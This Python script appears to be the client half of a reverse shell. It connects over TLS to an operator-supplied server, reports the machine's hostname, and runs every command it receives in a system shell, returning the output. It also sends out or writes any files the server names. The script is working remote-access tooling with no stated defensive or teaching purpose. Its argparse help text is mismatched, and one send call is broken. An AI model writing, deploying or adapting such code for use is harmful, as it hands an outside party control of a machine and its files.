import pprint
import socket
import ssl
import subprocess
import time 
import argparse

port_number = 5555
packet_size = 2048
hostname = socket.gethostname()
purpose = ssl.Purpose.SERVER_AUTH
context = ssl.create_default_context(purpose, cafile='certificates\\ca.crt')


def send_file(socket, filename):
    with open(filename,'rb') as inp:
        while True:
            print("sending data")
            bytes_read = inp.read(packet_size)
            if not bytes_read:
                print("breaking")
                time.sleep(1)
                socket.send(b'Send was done')
                break
            socket.send(bytes_read)
    inp.close()

def recv_file(socket,filename):
    with open(filename,'wb') as out:
        while True:
            print("recieving data")
            bytes_read = socket.recv(packet_size)
            print(bytes_read)
            if bytes_read == b'Send was done':
                print("breaking")
                break
            out.write(bytes_read)
    out.close()

def connect_server(ip_address):
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client_socket.connect((ip_address, port_number))
    print('Connected to host {!r} and port {}'.format(ip_address, port_number))
    #wraps the socket into SSL
    ssl_sock = context.wrap_socket(client_socket, server_hostname='localhost')
    ssl_sock.send(hostname.encode())
    return ssl_sock


def init_argparse():
  parser = argparse.ArgumentParser()
  parser.add_argument("-s", "--serverip", required=True,
                      help="Enter consul key after client, e.g. 'aws_mini_prod1/input'")
  return parser


if __name__=='__main__':
    parser = init_argparse()
    args = parser.parse_args()
    print(f"Trying to connect to {args.serverip} on port {port_number}")
    ssl_socket = connect_server(args.serverip)
    cmd = ssl_socket.recv(packet_size).decode().split(" ")
    while cmd!=['bye']:
        print(cmd)
        if(cmd[0] =='download'):
            file_name = cmd[-1]
            recv_file(ssl_socket,file_name)
            ssl_socket.send("Download file finished successfully")

        elif(cmd[0] =='upload'):
            send_file(ssl_socket,cmd[1])

        else:
            p =subprocess.Popen(cmd,stdout=subprocess.PIPE,stderr=subprocess.PIPE,shell=True)
            output,error = p.communicate()
            msg = str(output.decode())
            if not msg:
                msg =str(error.decode())
            ssl_socket.send(msg.encode())
            print(cmd)
            print('waiting for input from SRV')
        cmd = list(ssl_socket.recv(packet_size).decode().split(" "))
    ssl_socket.close()